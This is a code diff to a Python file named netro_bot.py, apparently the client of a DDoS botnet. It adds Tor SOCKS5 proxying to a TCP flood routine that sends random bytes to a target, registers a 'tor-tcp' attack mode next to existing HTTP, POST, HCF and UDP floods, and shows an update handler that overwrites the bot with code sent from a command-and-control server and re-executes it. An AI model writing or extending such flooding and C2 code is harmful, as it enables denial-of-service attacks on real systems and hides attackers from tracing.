@@ -248,7 +248,7 @@ class NetroTCP(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, target: str, timeout: float):
+    def __init__(self, target: str, timeout: float, tor_proxies: bool = False):
         host, port = target.split(":", 1)
         port = int(port)
 
@@ -262,18 +262,28 @@ class NetroTCP(object):
         self.host = host
         self.port = port
         self.host_ip = socket.gethostbyname(self.host)
+        self.tor_proxies = tor_proxies
     
     def create_attack_instance(self):
         self.active_threads += 1
 
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if self.tor_proxies:
+                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
             sock.settimeout(10)
+            
             sock.connect((self.host_ip, self.port))
+
             while time.time() < self.timeout and not self.kill:
                 sock.send(random._urandom(16))
+
         except Exception:
             return
+
         finally:
             self.active_threads -= 1
 
@@ -329,10 +339,12 @@ class NetroAttackManager(object):
                 netro_attack = NetroHTTP(url=target, timeout=timeout, tor_proxies=True)
             case "tor-post":
                 netro_attack = NetroHTTPPost(url=target, timeout=timeout, tor_proxies=True)
-            case "hcf":
-                netro_attack = NetroHCF(target=target)
             case "tor-hcf":
                 netro_attack = NetroHCF(target=target, tor_proxies=True)
+            case "tor-tcp":
+                netro_attack = NetroTCP(target=target, timeout=timeout, tor_proxies=True)
+            case "hcf":
+                netro_attack = NetroHCF(target=target)
             case "tcp":
                 netro_attack = NetroTCP(target=target, timeout=timeout)
             case "udp":
@@ -480,11 +492,15 @@ class NetroBot(object):
                 self.netro_attacks.stop_attack(attack_id=command_data["attack_id"])
     
     def on_update(self, sock: socket.socket, message: dict):
+        print(f"Received an update command from the CNC.")
+
         script_content = message["script_content"]
 
         with open(__file__, "w") as file:
             file.write(script_content)
             file.close()
+
+        print(f"Successfully updated netro_bot.py, re-initializing...")
 
         os.execv(sys.executable, ["python3" if sys.platform == "linux" else "python"] + sys.argv)
 
